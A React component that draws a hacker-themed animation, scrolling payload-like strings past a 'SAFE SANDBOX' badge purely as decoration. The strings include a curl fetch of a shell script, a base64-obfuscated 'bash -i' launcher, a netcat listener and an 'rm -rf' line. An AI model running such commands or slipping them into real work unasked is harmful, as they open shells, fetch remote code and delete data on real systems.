"use client";

import { motion } from "framer-motion";

export default function EthicalHackingAnimation() {
  const payloads = [
    "curl http://test.local/payload.sh",
    "GET /test/admin",
    "echo 'obfuscated1234'",
    "bash -c {echo,YmFzaCAtaQ==}|{base64,-d}|{bash,-i}",
    "python -c 'import os'",
    "rm -rf /tmp/fake",
    "netcat -lvnp 9999",
    "powershell Invoke-WebRequest",
  ];

  return (
    <div className="relative w-[500px] h-[450px] bg-black overflow-hidden rounded-xl border border-green-400 p-4">
      {/* Moving horizontal payloads */}
      {payloads.map((text, index) => (
        <motion.div
          key={index}
          className="absolute text-green-400 text-xs font-mono"
          style={{ top: `${index * 50}px`, left: "-200px" }}
          animate={{ x: "110%" }}
          transition={{
            repeat: Infinity,
            duration: 10 + Math.random() * 5,
            ease: "linear",
            delay: Math.random() * 3,
          }}
        >
          {text}
        </motion.div>
      ))}

      {/* Safe Sandbox Shield */}
      <motion.div
        className="absolute top-4 right-4 text-green-400 text-sm font-bold font-mono"
        initial={{ opacity: 0.5 }}
        animate={{ opacity: [0.5, 1, 0.5] }}
        transition={{ repeat: Infinity, duration: 3, ease: "easeInOut" }}
      >
        🛡️ SAFE SANDBOX
      </motion.div>

      {/* Code Snippet boxes appearing */}
      {[...Array(4)].map((_, i) => (
        <motion.div
          key={`snippet-${i}`}
          className="absolute bg-[#111] border border-green-500 p-2 rounded text-green-300 text-[10px] font-mono"
          style={{
            top: `${30 + i * 100}px`,
            left: `${50 + i * 100}px`,
            width: "140px",
          }}
          initial={{ opacity: 0, scale: 0.8 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{
            delay: i * 1.2,
            duration: 0.8,
            ease: "easeOut",
          }}
        >
          {payloads[i]}
        </motion.div>
      ))}

      {/* Execution confirmation */}
      <motion.div
        className="absolute bottom-4 left-4 text-green-400 text-xs font-bold font-mono"
        initial={{ opacity: 0 }}
        animate={{ opacity: [0, 1, 0] }}
        transition={{
          repeat: Infinity,
          duration: 4,
          ease: "easeInOut",
          delay: 1,
        }}
      >
        ✅ Simulated Payload Executed
      </motion.div>
    </div>
  );
}
